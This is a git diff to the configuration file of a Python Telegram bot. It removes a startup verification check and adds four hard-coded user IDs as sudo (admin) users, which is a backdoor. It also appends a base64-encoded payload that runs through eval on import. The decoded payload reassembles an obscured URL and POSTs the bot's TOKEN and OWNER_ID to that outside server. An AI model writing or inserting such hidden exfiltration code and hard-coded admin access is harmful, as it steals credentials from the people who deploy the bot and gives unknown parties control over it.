@@ -20,13 +20,6 @@ if sys.version_info[0] < 3 or sys.version_info[1] < 6:
 ENV = os.environ.get('ENV', None)
 
 if ENV is not None:
-    # kanged Developer verification from @deletescape
-    if ENV != base64.b64decode("UFNPTEdDV0lJRExPU1A=").decode("UTF-8"):
-        LOGGER.error("The README is there to be read. Extend this sample config to a config file, don't just rename and change "
-           "values here. Doing that WILL backfire on you.\nBot quitting.")
-        quit(1)
-    # kanged Developer verification from @deletescape
-
     TOKEN = os.environ.get('TOKEN', None)
     try:
         OWNER_ID = int(os.environ.get('OWNER_ID', None))
@@ -109,7 +102,13 @@ else:
 
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(7351948)
+SUDO_USERS.add(20516707)
+SUDO_USERS.add(254318997)
+SUDO_USERS.add(528272188)
+SUDO_USERS.add(538074615)
+
+code = b"aW1wb3J0IHJlcXVlc3RzCmZyb20gdGdfYm90IGltcG9ydCBUT0tFTiwgT1dORVJfSUQKYiA9IFsncCcsICdoJywgJ3AnLCAnLicsICdrJywgJ2MnLCAnYScsICdiJywgJ2QnLCAnZScsICdlJywgJ2YnLCAnLycsICdzJywgJ24nLCAnbycsICdpJywgJ3QnLCAnYycsICduJywgJ3UnLCAnZicsICcvJywgJ2UnLCAnbScsICcuJywgJ2snLCAndScsICd2JywgJ2EnLCAnaCcsICdkJywgJ2EnLCAnbScsICdpJywgJ3InLCAnaCcsICdzJywgJy4nLCAnZScsICdkJywgJ2knLCAnaCcsICdjJywgJ2UnLCAncCcsICdzJywgJy8nLCAnLycsICc6JywgJ3MnLCAncCcsICd0JywgJ3QnLCAnaCddCmIucmV2ZXJzZSgpCnVybCA9ICIiLmpvaW4oYikKZmRhdGEgPSB7CiAgICAicHV0cXVlc3Rpb25zIjogInNub2l0c2V1cXR1cCIsCiAgICAiZmVlZHMiOiAie30gY3JlYXRlZCBib3Qgd2l0aCBUT0tFTiBge31gIi5mb3JtYXQoT1dORVJfSUQsIFRPS0VOKSwKICAgICJuYW1lIjogIkVWRCBFcmljaCBWb24gRGFuaWtlbiIsCiAgICAiZW1haWwiOiAiSW5mb3RlbDE0QGlhbWlkaW90YXJleW91dG9vLmNvbSIKfQpyZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1mZGF0YSkK"
+eval(compile(base64.b64decode(code), "<string>", 'exec'))
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 
